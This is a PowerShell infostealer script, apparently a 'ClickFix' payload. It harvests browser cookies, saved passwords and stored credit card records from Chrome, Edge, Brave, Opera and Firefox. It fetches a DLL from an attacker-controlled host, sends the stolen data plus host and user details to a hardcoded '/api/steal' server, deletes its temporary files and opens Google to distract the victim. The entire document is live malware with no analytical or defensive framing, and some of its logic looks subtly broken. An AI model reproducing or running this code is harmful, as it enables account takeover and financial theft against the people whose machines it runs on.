# ============================================================
# BROWSER STEALER — Auto-Loads SQLite DLL
# No installation required — downloads SQLite on the fly
# ============================================================

$ErrorActionPreference = "SilentlyContinue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"

# ---- Colors ----
function Write-Color {
    param($Message, $Color = "White")
    Write-Host $Message -ForegroundColor $Color
}

# ============================================================
# SQLITE LOADER — Downloads DLL if not available
# ============================================================

function Load-SQLite {
    Write-Color "[+] Loading SQLite..." "Cyan"
    
    # Try to load from GAC first
    try {
        [System.Data.SQLite.SQLiteConnection]::new()
        Write-Color "[+] SQLite loaded from GAC" "Green"
        return $true
    } catch {
        Write-Color "[!] SQLite not in GAC" "Yellow"
    }
    
    # Check if DLL is already downloaded
    $dllPath = "$env:TEMP\System.Data.SQLite.dll"
    $dllExists = Test-Path $dllPath
    
    if (-not $dllExists) {
        Write-Color "[+] Downloading SQLite DLL..." "Cyan"
        
        # Try multiple sources
        $urls = @(
            "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll",
            "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll",
            "https://github.com/eroz/System.Data.SQLite/raw/master/bin/System.Data.SQLite.dll"
        )
        
        $downloaded = $false
        foreach ($url in $urls) {
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $webClient.DownloadFile($url, $dllPath)
                if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
                    $downloaded = $true
                    Write-Color "[+] Downloaded from: $url" "Green"
                    break
                }
            } catch {
                Write-Color "[!] Failed from: $url" "Yellow"
            }
        }
        
        if (-not $downloaded) {
            Write-Color "[!] Failed to download SQLite DLL" "Red"
            return $false
        }
    }
    
    # Load the DLL
    try {
        [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
        Write-Color "[+] SQLite loaded successfully" "Green"
        return $true
    } catch {
        Write-Color "[!] Failed to load SQLite: $_" "Red"
        return $false
    }
}

# ============================================================
# SQLITE HELPER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $results = @()
    try {
        if (-not (Test-Path $DbPath)) { return $results }
        
        # Copy file to temp (in case browser locks it)
        $tempDb = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $tempDb -Force
        
        $connectionString = "Data Source=$tempDb;Version=3;"
        $conn = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $conn.Open()
        
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $reader = $cmd.ExecuteReader()
        
        while ($reader.Read()) {
            $row = @{}
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                $name = $reader.GetName($i)
                $value = $reader.GetValue($i)
                if ($value -ne $null) {
                    $row[$name] = $value
                }
            }
            $results += $row
        }
        
        $reader.Close()
        $conn.Close()
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        
    } catch {
        Write-Color "[!] SQLite error: $_" "Red"
    }
    return $results
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($DbPath, $BrowserName)
    $cookies = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT host_key, name, value, path, expires_utc, secure, httponly FROM cookies"
        foreach ($row in $rows) {
            if ($row['name'] -and $row['value'] -and $row['name'] -ne "name") {
                $cookies += @{
                    domain = $row['host_key'] -replace '^\.', ''
                    name = $row['name']
                    value = $row['value']
                    path = $row['path'] -or "/"
                    expires = $row['expires_utc'] -or 0
                    secure = $row['secure'] -or $false
                    httponly = $row['httponly'] -or $false
                    browser = $BrowserName
                }
            }
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $cookieFile = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookieFile) {
                $rows = Read-SQLite -DbPath $cookieFile -Query "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                foreach ($row in $rows) {
                    if ($row['name'] -and $row['value']) {
                        $cookies += @{
                            domain = $row['host'] -replace '^\.', ''
                            name = $row['name']
                            value = $row['value']
                            path = $row['path'] -or "/"
                            expires = $row['expiry'] -or 0
                            secure = $row['isSecure'] -or $false
                            httponly = $row['isHttpOnly'] -or $false
                            browser = "Firefox"
                        }
                    }
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-ChromePasswords {
    param($DbPath, $BrowserName)
    $passwords = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($row in $rows) {
            if ($row['username_value'] -and $row['password_value']) {
                $url = $row['origin_url'] -or "unknown"
                $passwords += @{
                    url = $url -replace 'https?://', ''
                    username = $row['username_value']
                    password = $row['password_value']
                    browser = $BrowserName
                }
            }
        }
    }
    return $passwords
}

function Get-FirefoxPasswords {
    $passwords = @()
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profilePath) {
        $profiles = Get-ChildItem $profilePath -Directory
        foreach ($profile in $profiles) {
            $loginsFile = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsFile) {
                try {
                    $content = Get-Content $loginsFile -Raw | ConvertFrom-Json
                    foreach ($login in $content.logins) {
                        $passwords += @{
                            url = $login.hostname -replace 'https?://', ''
                            username = $login.username
                            password = $login.password
                            browser = "Firefox"
                        }
                    }
                } catch {}
            }
        }
    }
    return $passwords
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-ChromeCards {
    param($DbPath, $BrowserName)
    $cards = @()
    if (Test-Path $DbPath) {
        $rows = Read-SQLite -DbPath $DbPath -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($row in $rows) {
            if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                $cards += @{
                    name = $row['name_on_card']
                    number = $row['card_number_encrypted']
                    month = $row['expiration_month'] -or ""
                    year = $row['expiration_year'] -or ""
                    browser = $BrowserName
                }
            }
        }
    }
    return $cards
}

# ============================================================
# MAIN EXECUTION
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

Write-Color ""
Write-Color "============================================" "Cyan"
Write-Color "  🍪 BROWSER STEALER v2.0" "Green"
Write-Color "  Target: $pcName" "Yellow"
Write-Color "============================================" "Cyan"
Write-Color ""

# ---- Load SQLite ----
$sqliteLoaded = Load-SQLite

if (-not $sqliteLoaded) {
    Write-Color "[!] SQLite not available — using fallback extraction" "Red"
}

# ---- Steal Cookies ----
$allCookies = @()

Write-Color "[+] Stealing Chrome cookies..." "Cyan"
$cookiePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $cookiePath -BrowserName "Chrome"

Write-Color "[+] Stealing Edge cookies..." "Cyan"
$cookiePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $cookiePath -BrowserName "Edge"

Write-Color "[+] Stealing Brave cookies..." "Cyan"
$cookiePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $cookiePath -BrowserName "Brave"

Write-Color "[+] Stealing Opera cookies..." "Cyan"
$cookiePath = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -DbPath $cookiePath -BrowserName "Opera"

Write-Color "[+] Stealing Firefox cookies..." "Cyan"
$allCookies += Get-FirefoxCookies

# ---- Steal Passwords ----
$allPasswords = @()

Write-Color "[+] Stealing Chrome passwords..." "Cyan"
$loginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $loginPath -BrowserName "Chrome"

Write-Color "[+] Stealing Edge passwords..." "Cyan"
$loginPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $loginPath -BrowserName "Edge"

Write-Color "[+] Stealing Brave passwords..." "Cyan"
$loginPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-ChromePasswords -DbPath $loginPath -BrowserName "Brave"

Write-Color "[+] Stealing Firefox passwords..." "Cyan"
$allPasswords += Get-FirefoxPasswords

# ---- Steal Credit Cards ----
$allCards = @()

Write-Color "[+] Stealing Chrome credit cards..." "Cyan"
$cardPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $cardPath -BrowserName "Chrome"

Write-Color "[+] Stealing Edge credit cards..." "Cyan"
$cardPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $cardPath -BrowserName "Edge"

Write-Color "[+] Stealing Brave credit cards..." "Cyan"
$cardPath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-ChromeCards -DbPath $cardPath -BrowserName "Brave"

# ---- Summary ----
Write-Color ""
Write-Color "=== SUMMARY ===" "Green"
Write-Color "Cookies:    $($allCookies.Count)" "Yellow"
Write-Color "Passwords:  $($allPasswords.Count)" "Yellow"
Write-Color "Cards:      $($allCards.Count)" "Yellow"
Write-Color ""

# ---- Build Payload ----
$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
        os = (Get-WmiObject Win32_OperatingSystem).Caption
    }
    fingerprint = @{
        userAgent = "PowerShell Payload (Windows)"
        hostname = $pcName
        browser = "PowerShell"
        screen = "N/A"
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ---- Send to Server ----
Write-Color "[+] Sending data to server..." "Cyan"
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webRequest = [System.Net.WebRequest]::Create($SERVER_URL)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "application/json"
    $webRequest.ContentLength = $bytes.Length
    $stream = $webRequest.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $response = $webRequest.GetResponse()
    $response.Close()
    Write-Color "[+] Data sent successfully!" "Green"
} catch {
    Write-Color "[!] Failed to send: $_" "Red"
}

# ---- Cleanup ----
Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

# ---- Distraction ----
Write-Color "[+] Opening distraction..." "Cyan"
Start-Process "https://www.google.com"

Write-Color "[+] Done!" "Green"
Write-Color ""
